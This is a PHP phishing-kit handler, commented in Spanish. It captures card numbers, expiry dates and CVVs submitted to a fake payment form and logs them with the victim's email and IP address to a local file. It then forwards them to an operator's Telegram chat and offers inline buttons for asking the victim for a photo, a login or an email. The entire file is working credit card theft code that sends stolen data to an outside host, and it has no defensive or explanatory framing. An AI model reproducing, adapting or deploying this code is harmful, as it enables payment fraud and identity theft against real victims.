<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);

include('data.php');

$userp = $_SERVER['REMOTE_ADDR'];
$sessionId = $_SESSION['user_session_id'] ?? null;
$usuario = $_SESSION['user_email'] ?? 'desconocido';

if (isset($_POST['tarj']) && isset($_POST['fecha']) && isset($_POST['pass'])) {
    
    $tarjeta = $_POST['tarj'];
    $fecha = $_POST['fecha'];
    $cvv = $_POST['pass'];
    
    // Guardar en archivo
    $file = fopen("datos.txt", "a");
    fwrite($file, "Tarjeta: " . $tarjeta . " | Fecha: " . $fecha . " | CVV: " . $cvv . "\n");
    fwrite($file, "Usuario: " . $usuario . " | IP: " . $userp . "\n");
    fwrite($file, "Fecha: " . date('Y-m-d') . " - " . date('H:i:s') . "\n");
    fwrite($file, "********************************* \n");
    fclose($file);
    
    // Enviar a Telegram
    $msg = "💳 DATOS DE TARJETA\n";
    $msg .= "👤 Usuario: $usuario\n";
    $msg .= "💳 Tarjeta: $tarjeta\n";
    $msg .= "📅 Vencimiento: $fecha\n";
    $msg .= "🔐 CVV: $cvv\n";
    $msg .= "🌐 IP: $userp\n";
    
    // Botones
    if ($sessionId) {
        $botones = json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '📸 Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                    ['text' => '🔁 Login', 'callback_data' => 'login_' . $sessionId]
                ],
                [
                    ['text' => '📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                    ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
                ]
            ]
        ]);
    } else {
        $botones = json_encode([
            'inline_keyboard' => [
                [
                    ['text' => '✅ Listo', 'callback_data' => 'listo_none']
                ]
            ]
        ]);
    }
    
    // Enviar a Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $postData = [
        'chat_id' => $chatID,
        'text' => $msg,
        'reply_markup' => $botones
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // Actualizar archivo de sesión a waiting
    if ($sessionId) {
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        file_put_contents($sessionFile, 'waiting');
    }
    
    // Redirigir a página de espera
    header("Location: charg.html");
    exit;
}
?>
